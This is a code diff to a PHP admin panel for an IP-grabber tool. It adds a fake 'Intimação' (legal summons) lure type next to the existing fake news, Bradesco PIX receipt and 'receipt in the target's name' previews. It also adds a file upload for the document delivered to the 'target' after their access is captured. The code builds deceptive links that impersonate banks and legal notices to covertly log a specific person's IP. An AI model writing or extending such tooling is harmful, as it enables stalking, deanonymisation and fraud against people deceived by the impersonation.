@@ -118,6 +118,7 @@ class IpGrabberResource extends Resource
                             'noticia' => 'Notícia externa',
                             'pix_bradesco' => 'PIX Bradesco (comprovante)',
                             'pix_nome_alvo' => 'Comprovante PIX em nome do alvo',
+                            'intimacao' => 'Intimação',
                         ])
                         ->default('mensagem')
                         ->selectablePlaceholder(false)
@@ -150,7 +151,19 @@ class IpGrabberResource extends Resource
                         ->selectablePlaceholder(false)
                         ->live()
                         ->required()
-                        ->visible(fn (Get $get): bool => $get('preview_tipo') !== 'noticia')
+                        ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
+                        ->columnSpanFull(),
+
+                    Forms\Components\FileUpload::make('intimacao_arquivo')
+                        ->label('Arquivo da intimação')
+                        ->helperText('PDF ou documento a ser entregue ao alvo após a captura.')
+                        ->disk('public')
+                        ->directory('intimacoes')
+                        ->visibility('public')
+                        ->acceptedFileTypes(['application/pdf', 'image/jpeg', 'image/png'])
+                        ->maxSize(10240)
+                        ->required(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
+                        ->visible(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                         ->columnSpanFull(),
 
                     Forms\Components\TextInput::make('redirect_url')
@@ -158,8 +171,8 @@ class IpGrabberResource extends Resource
                         ->placeholder('https://site.com/pagina')
                         ->url()
                         ->maxLength(255)
-                        ->required(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && $get('preview_tipo') !== 'noticia')
-                        ->visible(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && $get('preview_tipo') !== 'noticia')
+                        ->required(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
+                        ->visible(fn (Get $get): bool => $get('mensagem') === 'Redirecionar para página' && ! in_array($get('preview_tipo'), ['noticia', 'intimacao'], true))
                         ->helperText('Após registrar o acesso, o navegador será direcionado para esta URL.')
                         ->columnSpanFull(),
 
